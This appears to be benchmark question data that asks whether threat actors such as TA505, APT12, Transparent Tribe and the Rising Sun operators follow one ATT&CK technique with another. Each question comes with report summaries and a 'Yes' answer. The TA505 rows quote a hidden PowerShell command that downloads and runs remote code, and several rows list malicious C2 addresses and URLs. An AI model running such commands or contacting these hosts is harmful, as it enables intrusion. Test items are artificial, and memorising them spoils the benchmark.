694,187,187-Initial Access-T1566-Phishing,"After deploying malicious attachments or web-links via spear-phishing and phishing mass-mailing to gain initial access, is it likely that Russian-speaking cybercriminals will download programs for remote administration tools to compromise systems' administrators' credentials during the execution phase?","Initial Access: The CTI report details the initial access methods used by Russian-speaking cybercriminals, which include spear-phishing and phishing mass-mailing with malicious attachments or web-links. Infection can also occur through compromised websites that redirect users to exploit sites, leading to automatic malware downloads (drive-by downloads).","Execution: The report describes the execution phase where cybercriminals download programs for remote, hidden administration onto compromised computers to gain system administrators' credentials. They often use legal remote management tools known to many users.
Defense Evasion: To evade defenses, cybercriminals set up malware within the infrastructure software of the attacked organization, enabling easy access to the internal corporate network from outside. They also ensure that internal sites of compromised organizations have the malware reinstalled when the organization's security software deletes the previous version.
Discovery: In the discovery phase, cybercriminals use remote administration tools to gain system administrators' credentials and explore the financial systems of the targeted organization.
Impact: The impact of Russian-speaking cybercriminals' activities includes multi-million dollar losses for attacked organizations. The final stage of their attacks involves transferring money from the organization's accounts to mule projects or withdrawing money directly at ATMs.
Others: The CTI report provides an overview of the Russian-speaking cybercriminal market, including the types of crimes committed, the structure of criminal groups, and the roles within these groups. It also discusses the challenges in combating financial cybercrime, such as inadequate legislation and lack of international cooperation. Kaspersky Lab's efforts in investigating and responding to cyber incidents are highlighted, emphasizing the need for global collaboration to address the threat.",Yes,Kaspersky_Lab_cybercrime_underground_report_eng_v1_0
696,187,187-Discovery-T1087-Account Discovery,"After evading defenses by reinstalling malware on internal sites of compromised organizations using infrastructure software, is it likely that cybercriminals will use remote administration tools to explore financial systems after gaining system administrators' credentials during the discovery phase?","Discovery: In the discovery phase, cybercriminals use remote administration tools to gain system administrators' credentials and explore the financial systems of the targeted organization.","Initial Access: The CTI report details the initial access methods used by Russian-speaking cybercriminals, which include spear-phishing and phishing mass-mailing with malicious attachments or web-links. Infection can also occur through compromised websites that redirect users to exploit sites, leading to automatic malware downloads (drive-by downloads).
Execution: The report describes the execution phase where cybercriminals download programs for remote, hidden administration onto compromised computers to gain system administrators' credentials. They often use legal remote management tools known to many users.
Defense Evasion: To evade defenses, cybercriminals set up malware within the infrastructure software of the attacked organization, enabling easy access to the internal corporate network from outside. They also ensure that internal sites of compromised organizations have the malware reinstalled when the organization's security software deletes the previous version.
Impact: The impact of Russian-speaking cybercriminals' activities includes multi-million dollar losses for attacked organizations. The final stage of their attacks involves transferring money from the organization's accounts to mule projects or withdrawing money directly at ATMs.
Others: The CTI report provides an overview of the Russian-speaking cybercriminal market, including the types of crimes committed, the structure of criminal groups, and the roles within these groups. It also discusses the challenges in combating financial cybercrime, such as inadequate legislation and lack of international cooperation. Kaspersky Lab's efforts in investigating and responding to cyber incidents are highlighted, emphasizing the need for global collaboration to address the threat.",Yes,Kaspersky_Lab_cybercrime_underground_report_eng_v1_0
698,187,187-Impact-T1657-Financial Theft,"After Russian-speaking cybercriminals explore the financial systems of the targeted organizations using remote administration tools in the discovery phase, is it likely that they will cause multi-million dollar losses and transfer or withdraw money during the impact phase?",Impact: The impact of Russian-speaking cybercriminals' activities includes multi-million dollar losses for attacked organizations. The final stage of their attacks involves transferring money from the organization's accounts to mule projects or withdrawing money directly at ATMs.,"Initial Access: The CTI report details the initial access methods used by Russian-speaking cybercriminals, which include spear-phishing and phishing mass-mailing with malicious attachments or web-links. Infection can also occur through compromised websites that redirect users to exploit sites, leading to automatic malware downloads (drive-by downloads).
Execution: The report describes the execution phase where cybercriminals download programs for remote, hidden administration onto compromised computers to gain system administrators' credentials. They often use legal remote management tools known to many users.
Defense Evasion: To evade defenses, cybercriminals set up malware within the infrastructure software of the attacked organization, enabling easy access to the internal corporate network from outside. They also ensure that internal sites of compromised organizations have the malware reinstalled when the organization's security software deletes the previous version.
Discovery: In the discovery phase, cybercriminals use remote administration tools to gain system administrators' credentials and explore the financial systems of the targeted organization.
Others: The CTI report provides an overview of the Russian-speaking cybercriminal market, including the types of crimes committed, the structure of criminal groups, and the roles within these groups. It also discusses the challenges in combating financial cybercrime, such as inadequate legislation and lack of international cooperation. Kaspersky Lab's efforts in investigating and responding to cyber incidents are highlighted, emphasizing the need for global collaboration to address the threat.",Yes,Kaspersky_Lab_cybercrime_underground_report_eng_v1_0
704,189,189-Defense Evasion-T1112-Modify Registry,"After hijacking the RegIdleBackup scheduled task and altering its COM handler to execute the FlawedGrace RAT for persistence, is TA505 likely to encode the FlawedGrace RAT loader in Base64 strings within the registry as part of defense evasion?","Defense Evasion: TA505 modified the registry to ensure the hijacked RegIdleBackup scheduled task executed the FlawedGrace RAT loader, which was stored as Base64 encoded strings in the registry.","Initial Access: On November 8, 2021, NCC Group reported that TA505, a known cybercrime threat actor, has been exploiting a vulnerability in SolarWinds Serv-U software, identified as CVE-2021-35211, to gain initial access to victims' IT infrastructure. This marks a shift from TA505's typical phishing-based methods to exploiting software vulnerabilities for initial access. SolarWinds released a security advisory on July 9, 2021, and Microsoft reported on July 13, 2021, that the vulnerability was being exploited by a different threat actor, DEV-0322. TA505's exploitation of the vulnerability allows them to control a subprocess of Serv-U, enabling further penetration into the network.
Execution: TA505 utilized Base64 encoded PowerShell commands to deploy Cobalt Strike Beacon on systems running the vulnerable Serv-U software. The PowerShell command used for deployment was observed as follows: powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://IP:PORT/a')).
Persistence: TA505 attempted to maintain access by hijacking a scheduled task named RegIdleBackup and altering the COM handler associated with it to execute the FlawedGrace RAT. The legitimate CLSID for the COM handler is {CA767AA8-9157-4604-B64B-40747123D5F2}, but TA505 changed it to a different CLSID, which redirected to another CLSID containing three objects with the FlawedGrace RAT loader encoded in Base64.
Others: NCC Group's global Cyber Incident Response Team has noticed an increase in Clop ransomware victims, which is linked to the exploitation of the SolarWinds Serv-U vulnerability by TA505. Organizations using SolarWinds Serv-U software are advised to update to the latest version and check for signs of exploitation. NCC Group mapped the internet for vulnerable servers and found a significant number still at risk, with the top vulnerable versions listed. The top countries with potentially vulnerable servers include China, the United States, Canada, and others. The MITRE ATT&CK mapping for TA505's activities includes T1190 for Initial Access, T1059.001 for Execution, T1053.005 for Persistence, and T1112 for Defense Evasion.",Yes,TA505 exploits SolarWinds Serv-U vulnerability (CVE-2021-35211) for initial access – NCC Group Research
705,189,189-Defense Evasion-T1140-Deobfuscate/Decode Files or Information,"After gaining initial access by exploiting the SolarWinds Serv-U vulnerability (CVE-2021-35211) and executing Cobalt Strike Beacon on the compromised systems using Base64 encoded PowerShell commands, is it likely that TA505 will store the FlawedGrace RAT loader as Base64 encoded strings for defense evasion?","Defense Evasion: TA505 modified the registry to ensure the hijacked RegIdleBackup scheduled task executed the FlawedGrace RAT loader, which was stored as Base64 encoded strings in the registry.","Initial Access: On November 8, 2021, NCC Group reported that TA505, a known cybercrime threat actor, has been exploiting a vulnerability in SolarWinds Serv-U software, identified as CVE-2021-35211, to gain initial access to victims' IT infrastructure. This marks a shift from TA505's typical phishing-based methods to exploiting software vulnerabilities for initial access. SolarWinds released a security advisory on July 9, 2021, and Microsoft reported on July 13, 2021, that the vulnerability was being exploited by a different threat actor, DEV-0322. TA505's exploitation of the vulnerability allows them to control a subprocess of Serv-U, enabling further penetration into the network.
Execution: TA505 utilized Base64 encoded PowerShell commands to deploy Cobalt Strike Beacon on systems running the vulnerable Serv-U software. The PowerShell command used for deployment was observed as follows: powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://IP:PORT/a')).
Persistence: TA505 attempted to maintain access by hijacking a scheduled task named RegIdleBackup and altering the COM handler associated with it to execute the FlawedGrace RAT. The legitimate CLSID for the COM handler is {CA767AA8-9157-4604-B64B-40747123D5F2}, but TA505 changed it to a different CLSID, which redirected to another CLSID containing three objects with the FlawedGrace RAT loader encoded in Base64.
Others: NCC Group's global Cyber Incident Response Team has noticed an increase in Clop ransomware victims, which is linked to the exploitation of the SolarWinds Serv-U vulnerability by TA505. Organizations using SolarWinds Serv-U software are advised to update to the latest version and check for signs of exploitation. NCC Group mapped the internet for vulnerable servers and found a significant number still at risk, with the top vulnerable versions listed. The top countries with potentially vulnerable servers include China, the United States, Canada, and others. The MITRE ATT&CK mapping for TA505's activities includes T1190 for Initial Access, T1059.001 for Execution, T1053.005 for Persistence, and T1112 for Defense Evasion.",Yes,TA505 exploits SolarWinds Serv-U vulnerability (CVE-2021-35211) for initial access – NCC Group Research
706,19,19-Defense Evasion-T1140-Deobfuscate/Decode Files or Information,"After deploying updated versions of their malware, including Aumlib and Ixeshe, in the execution phase, is it likely that APT12 will attempt to encode the HTTP POST body of Aumlib malware and employ a different Base64 encoding pattern for Ixeshe malware traffic as part of defense evasion before connecting to specific URLs such as status[.]acmetoy[.]com/DD/myScript.js during command and control?","Defense Evasion: The updated Aumlib malware encodes its HTTP POST body, differing from previous variants that transmitted data in clear text. This change may help it bypass existing Intrusion Detection System (IDS) signatures. Similarly, the new Ixeshe sample uses a different Base64 encoding pattern in its network traffic, which may evade signatures designed to detect Ixeshe-related infections.","Execution: The attackers behind the New York Times network breach have deployed updated versions of their malware, Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe. Aumlib now encodes certain HTTP communications, and Ixeshe exhibits new network traffic patterns to potentially evade detection.
Command and Control: The updated Aumlib malware sample, identified by hash value 832f5e01be536da71d5b3f7e41938cfb, was downloaded from URLs such as status[.]acmetoy[.]com/DD/myScript.js or status[.]acmetoy[.]com/DD/css.css. It shares code with an older variant, which connected to documents[.]myPicture[.]info. The new Ixeshe sample, with hash aa873ed803ca800ce92a39d9a683c644, contains encoded data with victim information and a campaign tag, indicating a method of tracking attacks.
Others: The attackers, known as APT12, have been silent since January after an expose and have now re-emerged with improved malware. The changes in their tactics, techniques, and procedures (TTPs) suggest a deliberate evolution in response to external pressures, such as the exposure of their activities. Understanding these changes is crucial for predicting future modifications in their strategy.",Yes,NYTimes_Attackers_Evolve_Quickly
708,19,19-Command and Control-T1105-Ingress Tool Transfer,"After evading detection by altering HTTP communication patterns through encoding techniques in malware like Aumlib and Ixeshe, is it likely that the Aumlib malware will download its updated sample from specific URLs and share code with an older variant as part of the attackers' command and control activity?","Command and Control: The updated Aumlib malware sample, identified by hash value 832f5e01be536da71d5b3f7e41938cfb, was downloaded from URLs such as status[.]acmetoy[.]com/DD/myScript.js or status[.]acmetoy[.]com/DD/css.css. It shares code with an older variant, which connected to documents[.]myPicture[.]info. The new Ixeshe sample, with hash aa873ed803ca800ce92a39d9a683c644, contains encoded data with victim information and a campaign tag, indicating a method of tracking attacks.","Execution: The attackers behind the New York Times network breach have deployed updated versions of their malware, Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe. Aumlib now encodes certain HTTP communications, and Ixeshe exhibits new network traffic patterns to potentially evade detection.
Defense Evasion: The updated Aumlib malware encodes its HTTP POST body, differing from previous variants that transmitted data in clear text. This change may help it bypass existing Intrusion Detection System (IDS) signatures. Similarly, the new Ixeshe sample uses a different Base64 encoding pattern in its network traffic, which may evade signatures designed to detect Ixeshe-related infections.
Others: The attackers, known as APT12, have been silent since January after an expose and have now re-emerged with improved malware. The changes in their tactics, techniques, and procedures (TTPs) suggest a deliberate evolution in response to external pressures, such as the exposure of their activities. Understanding these changes is crucial for predicting future modifications in their strategy.",Yes,NYTimes_Attackers_Evolve_Quickly
711,190,190-Execution-T1204-User Execution,Is it likely that officials of the Indian Ministry of External Affairs were lured through a spear phishing email containing a malicious XLS document before macro code in the downloaded document executed to drop the first payload leading to the subsequent download of Crimson RAT?,"Execution: The malicious document contained macro code which executed to drop the first payload, a Crimson RAT downloader. This payload then downloaded a fully functional Crimson RAT from the IP address 151.106.19[.]207:8246.","Initial Access: Volon's Research team observed a spear phishing attack on Officials of the Indian Ministry of External Affairs in early August. The email lured officials by asking them to download an MS Excel sheet named 'amended training schedule of IFS officers'. The download link provided in the email appeared to be from 'https://www.mea.gov.in/ifs-training.schedule', but it actually pointed to a malicious XLS document from the URL 'http://info-sharing.net/?a=1533541533'.
Persistence: The first payload downloaded the fully functional Crimson RAT and dropped it to the path 'C:\ProgramData\Hurmz\bahgrtmrs.exe'.
Defense Evasion: The payload had the capability to kill any process running in the system using specific code.
Credential Access: The Crimson RAT had functionalities for keylogging and browser credential theft.
Command and Control: The payload received commands from the C&C server and supported various commands such as listing running processes, listing antiviruses, sending file info, downloading files, updating the binary, and sending disk drives list. It also had the capability to send files to the C&C server.
Others: A document with similar tactics, techniques, and procedures (TTPs) was identified in early August with the name 'MoFA-MoDAfghanistan.xls', uploaded on 3rd August 2018. The XLS file contained malicious macro code, which upon execution, downloaded a payload from the URL 'http://afgcloud7.com/upld/updt.dll'. In 2016, Proofpoint published a report on 'Operation Transparent Tribe', detailing various attacks against Indian Embassies using Crimson RAT. One of the campaigns fetched a payload from the same URL as found in the second campaign 'http://afgcloud7.com/upld/updt.dll'. This suggests that the APT group behind Operation Transparent Tribe is active and targeting Indian officials again. The conclusion is that there is a high probability that the APT group behind 'Operation Transparent Tribe' might be active and is targeting Indian organizations again. Indicators of Compromise include various hashes and IP addresses: 58d52690179c2467fce76cec126ec5bb915f32d66955de954bd89e3110d6a03e0f0f6f48c3ee5f8e7cd3697c40002bc76b4635023eb1372df9b7618a5dae6128, 151.106.19.207:8246, 151.106.19.207:3286, 151.106.19.207:12621, and 'http://info-sharing.net/?a=1533541533'.",Yes,Targeted Attack on Indian Ministry of External Affairs using Crimson RAT
712,190,190-Credential Access-T1056-Input Capture,"After executing the macro code within the malicious document to download the Crimson RAT, is it likely that the malware will use its functionalities for keylogging and browser credential theft before establishing Command and Control communication to receive and execute various commands?",Credential Access: The Crimson RAT had functionalities for keylogging and browser credential theft.,"Initial Access: Volon's Research team observed a spear phishing attack on Officials of the Indian Ministry of External Affairs in early August. The email lured officials by asking them to download an MS Excel sheet named 'amended training schedule of IFS officers'. The download link provided in the email appeared to be from 'https://www.mea.gov.in/ifs-training.schedule', but it actually pointed to a malicious XLS document from the URL 'http://info-sharing.net/?a=1533541533'.
Execution: The malicious document contained macro code which executed to drop the first payload, a Crimson RAT downloader. This payload then downloaded a fully functional Crimson RAT from the IP address 151.106.19[.]207:8246.
Persistence: The first payload downloaded the fully functional Crimson RAT and dropped it to the path 'C:\ProgramData\Hurmz\bahgrtmrs.exe'.
Defense Evasion: The payload had the capability to kill any process running in the system using specific code.
Command and Control: The payload received commands from the C&C server and supported various commands such as listing running processes, listing antiviruses, sending file info, downloading files, updating the binary, and sending disk drives list. It also had the capability to send files to the C&C server.
Others: A document with similar tactics, techniques, and procedures (TTPs) was identified in early August with the name 'MoFA-MoDAfghanistan.xls', uploaded on 3rd August 2018. The XLS file contained malicious macro code, which upon execution, downloaded a payload from the URL 'http://afgcloud7.com/upld/updt.dll'. In 2016, Proofpoint published a report on 'Operation Transparent Tribe', detailing various attacks against Indian Embassies using Crimson RAT. One of the campaigns fetched a payload from the same URL as found in the second campaign 'http://afgcloud7.com/upld/updt.dll'. This suggests that the APT group behind Operation Transparent Tribe is active and targeting Indian officials again. The conclusion is that there is a high probability that the APT group behind 'Operation Transparent Tribe' might be active and is targeting Indian organizations again. Indicators of Compromise include various hashes and IP addresses: 58d52690179c2467fce76cec126ec5bb915f32d66955de954bd89e3110d6a03e0f0f6f48c3ee5f8e7cd3697c40002bc76b4635023eb1372df9b7618a5dae6128, 151.106.19.207:8246, 151.106.19.207:3286, 151.106.19.207:12621, and 'http://info-sharing.net/?a=1533541533'.",Yes,Targeted Attack on Indian Ministry of External Affairs using Crimson RAT
716,191,191-Command and Control-T1071-Application Layer Protocol,"After performing initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, and OS product name from the registry, is the Rising Sun implant likely to communicate with control servers, such as 34.214.99.20/view_style.php and kingkoil.com.sg/board.php, for command and control purposes using HTTP POST requests?","Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
717,191,191-Command and Control-T1573-Encrypted Channel,"After performing initial reconnaissance by gathering system and network information such as network adapter details, computer name, and IP address, is it likely that the Rising Sun implant will communicate with control servers via an encrypted channel using RC4 before exfiltrating data obfuscated with Base64 encoding to the control server?","Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
718,191,191-Command and Control-T1001-Data Obfuscation,"After the Rising Sun implant performed initial reconnaissance by decrypting and collecting network and system information, is it likely that it communicated with control servers via HTTP POST requests for command and control purposes?","Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
720,191,191-Discovery-T1016-System Network Configuration Discovery,"After ensuring persistence by downloading the second-stage binary to the startup folder, is the Rising Sun implant likely to perform initial reconnaissance by fetching network adapter info and IP address information as part of discovery before communicating with control servers using HTTP POST requests?","Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
721,191,191-Discovery-T1033-System Owner/User Discovery,"After ensuring persistence by downloading the second-stage binary to the startup folder during the download process, is it likely that the Rising Sun implant will fetch computer name and user name information as part of its discovery activities before communicating with control servers using HTTP POST requests?","Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.","Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
726,191,191-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the Rising Sun implant performed initial reconnaissance by collecting system and network details and communicated with control servers using HTTP POST requests encrypted with RC4 and obfuscated with Base64 encoding, is it likely that the implant would use RC4 stream encryption and Base64 encoding to facilitate data exfiltration to the control server?",Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.,"Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Discovery: The Rising Sun implant performed initial reconnaissance by fetching network adapter info, computer name, user name, IP address information, native system information, and OS product name from the registry. It also decrypted additional information during the reconnaissance process, although not all of it was used by the implant.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",Yes,rp-operation-sharpshooter
732,193,193-Reconnaissance-T1589-Gather Victim Identity Information,"After the Iranian state-backed hackers used phishing attacks through email and social media accounts to gain initial access by targeting individuals involved in sanctions against Iran, is it likely that they tailored their targeting approach by gathering information about the victim's cyber knowledge, contacts, activities, working time, and geographic location?","Reconnaissance: Certfa's review of 'The Return of The Charming Kitten' campaign reveals that Iranian state-backed hackers have targeted individuals involved in sanctions against Iran, as well as politicians, activists, and journalists worldwide. The attackers collected information on their targets prior to phishing attacks, tailoring their approach based on the target's cyber knowledge, contacts, activities, working time, and geographic location.","Initial Access: The campaign utilized phishing attacks through unknown email or social media accounts and compromised accounts of public figures. The attackers sent fake security alerts from email addresses like notifications.mailservices@gmail[.]com, and noreply.customermails@gmail[.]com, claiming unauthorized access attempts. They also used Google Site to create fake Google Drive download pages to trick users into entering their credentials.
